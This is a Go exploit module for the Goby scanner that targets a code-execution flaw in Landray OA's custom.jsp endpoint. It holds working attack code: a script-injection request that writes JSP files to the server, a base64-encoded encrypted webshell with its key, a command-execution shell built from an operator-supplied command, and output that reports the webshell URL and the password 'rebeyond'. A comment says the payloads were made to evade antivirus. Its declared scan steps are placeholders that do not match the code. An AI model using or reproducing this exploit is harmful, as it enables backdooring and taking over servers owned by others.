package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Landary OA /sys/ui/extend/varkind/custom.jsp Code Execution Vulnerability",
    "Description": "<p>BlueLine OA is an office automation system that provides office process management, document management, collaborative office, attendance management and other functions. Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire web server</p>",
    "Product": "Landray-OA",
    "Homepage": "http://www.landray.com.cn/",
    "DisclosureDate": "2023-11-14",
    "PostTime": "2024-03-26",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"lui_login_message_td\" || body=\"com.landray.kmss.km.archives.model.KmArchivesBorrow\" || body=\"return kmss_onsubmit()\" || body=\"SPRING_SECURITY_TARGET_URL\" || title=\"欢迎登录智慧协同平台\" || body=\"蓝凌软件 版权所有\" || header=\"/resource/anonym.jsp\" || banner=\"/resource/anonym.jsp\"",
    "GobyQuery": "body=\"lui_login_message_td\" || body=\"com.landray.kmss.km.archives.model.KmArchivesBorrow\" || body=\"return kmss_onsubmit()\" || body=\"SPRING_SECURITY_TARGET_URL\" || title=\"欢迎登录智慧协同平台\" || body=\"蓝凌软件 版权所有\" || header=\"/resource/anonym.jsp\" || banner=\"/resource/anonym.jsp\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire web server</p>",
    "Recommendation": "<p>1. Ask the user to contact the vendor to fix the vulnerability <a href=\"https://www.landray.com.cn/\">https://www.landray.com.cn/</a></p><p>2. Set up access policies and whitelisting through firewalls and other security devices.</p><p>3. If not necessary, prohibit access to the system on the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,custom,cmd",
            "show": ""
        },
        {
            "name": "shellName",
            "type": "input",
            "value": "polite.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "shellContent",
            "type": "input",
            "value": "PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4=",
            "show": "attackType=custom"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "蓝凌OA /sys/ui/extend/varkind/custom.jsp 代码执行漏洞",
            "Product": "Landray-OA系统",
            "Description": "<p>蓝凌OA是一款办公自动化系统，提供了办公流程管理、文档管理、协同办公、考勤管理等功能，攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Recommendation": "<p>1. 请用户及时联系厂商修复漏洞，<a href=\"https://www.landray.com.cn/\" target=\"_blank\">https://www.landray.com.cn/</a></p><p>2. 通过防火墙等安全设备设置访问策略，设置白名单</p><p>3. 如非必要，禁止公网访问该系统</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Landary OA /sys/ui/extend/varkind/custom.jsp Code Execution Vulnerability",
            "Product": "Landray-OA",
            "Description": "<p>BlueLine OA is an office automation system that provides office process management, document management, collaborative office, attendance management and other functions.&nbsp;Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire web server</p>",
            "Recommendation": "<p>1. Ask the user to contact the vendor to fix the vulnerability&nbsp;<a href=\"https://www.landray.com.cn/\" target=\"_blank\">https://www.landray.com.cn/</a></p><p>2. Set up access policies and whitelisting through firewalls and other security devices.</p><p>3. If not necessary, prohibit access to the system on the public network.</p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire web server</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10938"
}`
	uploadFilepolite123 := func(hostInfo *httpclient.FixUrl, filename string, content string) (*httpclient.HttpResponse, error) {
		// 对于同名的文件只能上传一次,否则会被更改文件名，且有的系统可以上传，但对存在文件夹路径做了鉴权处理，访问需要权限,有的有防火墙，需要做免杀，故文件上传 payload 均做了免杀。POC检测的为成功上传且可以访问的
		uploadRequestConfig := httpclient.NewPostRequestConfig("/sys/ui/extend/varkind/custom.jsp")
		uploadRequestConfig.VerifyTls = false
		uploadRequestConfig.FollowRedirect = false
		uploadRequestConfig.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36")
		uploadRequestConfig.Header.Store("Accept", "*/*")
		uploadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		uploadRequestConfig.Header.Store("Connection", "close")
		//uploadRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryt1qdEWTI01cj5BLV")
		uploadRequestConfig.Data = content
		//uploadRequestConfig.Data = "------WebKitFormBoundaryt1qdEWTI01cj5BLV\r\nContent-Disposition: form-data; name=\"NewFile\"; filename=\"" + filename + "\"\r\nContent-Type: image/jpeg\r\n\r\n" + content + "\r\n------WebKitFormBoundaryt1qdEWTI01cj5BLV\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nupload\r\n------WebKitFormBoundaryt1qdEWTI01cj5BLV--\r\n"
		if resp, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig); resp != nil && resp.StatusCode == 200 {
			getFileConfig := httpclient.NewGetRequestConfig("/" + filename)
			getFileConfig.VerifyTls = false
			getFileConfig.FollowRedirect = false
			return httpclient.DoHttpRequest(hostInfo, getFileConfig)
		} else if err != nil {
			return nil, err
		}
		return nil, errors.New("漏洞利用失败")
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			filename := "login" + goutils.RandomHexString(5) + ".jsp"
			content := "var={\"body\":{\"file\":\"/sys/common/dataxml.jsp\"}}&s_bean=sysFormulaValidate&script=\nimport%20java.lang.*;import%20java.io.*;Class%20cls=Thread.currentThread().getContextClassLoader().loadClass(\"bsh.Interpreter\");String%20path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File%20f=new%20File(path.split(\"WEB-INF\")[0]%2B\"/" + filename + "\");f.createNewFile();FileOutputStream%20fout=new%20FileOutputStream(f);fout.write(new%20sun.misc.BASE64Decoder().decodeBuffer(\"PCUgb3V0LnByaW50bG4oImNoZWNrU3RyaW5nIik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTsgJT4=\"));fout.close();&type=int&modelName=test"
			resp, err := uploadFilepolite123(hostInfo, filename, content)
			if err != nil {
				return false
			}
            if !strings.Contains(resp.Utf8Html, "checkString") {
				return false
			}
			ss.VulURL = hostInfo.FixedHostInfo + "/sys/ui/extend/varkind/custom.jsp"
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attacktype := goutils.B2S(ss.Params["attackType"])
			filename := "login" + goutils.RandomHexString(2) + goutils.B2S(ss.Params["shellName"])
			content := goutils.B2S(ss.Params["shellContent"])
			if attacktype == "cmd" {
				filename = "login" + "test" + goutils.B2S(ss.Params["shellName"])
				cmd := goutils.B2S(ss.Params["cmd"])
				cmdshell := "<%=new java.util.Scanner(Runtime.getRuntime().exec(\"" + cmd + "\").getInputStream()).useDelimiter(\"\\\\A\").next()%>"
				cmdshell = base64.RawURLEncoding.EncodeToString([]byte(cmdshell))
				cmdcontent := "var={\"body\":{\"file\":\"/sys/common/dataxml.jsp\"}}&s_bean=sysFormulaValidate&script=\nimport%20java.lang.*;import%20java.io.*;Class%20cls=Thread.currentThread().getContextClassLoader().loadClass(\"bsh.Interpreter\");String%20path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File%20f=new%20File(path.split(\"WEB-INF\")[0]%2B\"/" + filename + "\");f.createNewFile();FileOutputStream%20fout=new%20FileOutputStream(f);fout.write(new%20sun.misc.BASE64Decoder().decodeBuffer(\"" + cmdshell + "\"));fout.close();&type=int&modelName=test"
				if respOne, err := uploadFilepolite123(expResult.HostInfo, filename, cmdcontent); respOne.StatusCode == 200 || respOne.StatusCode == 500 {
					expResult.Success = true
					expResult.Output = respOne.RawBody + "\n"
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
				return expResult
			}
			shellcontent := "var={\"body\":{\"file\":\"/sys/common/dataxml.jsp\"}}&s_bean=sysFormulaValidate&script=\nimport%20java.lang.*;import%20java.io.*;Class%20cls=Thread.currentThread().getContextClassLoader().loadClass(\"bsh.Interpreter\");String%20path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File%20f=new%20File(path.split(\"WEB-INF\")[0]%2B\"/" + filename + "\");f.createNewFile();FileOutputStream%20fout=new%20FileOutputStream(f);fout.write(new%20sun.misc.BASE64Decoder().decodeBuffer(\"" + content + "\"));fout.close();&type=int&modelName=test"
			if resp, err := uploadFilepolite123(expResult.HostInfo, filename, shellcontent); resp.StatusCode == 200 || resp.StatusCode == 500 {
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
				if attacktype == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
					expResult.Output += "Webshell type: jsp"
				}
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
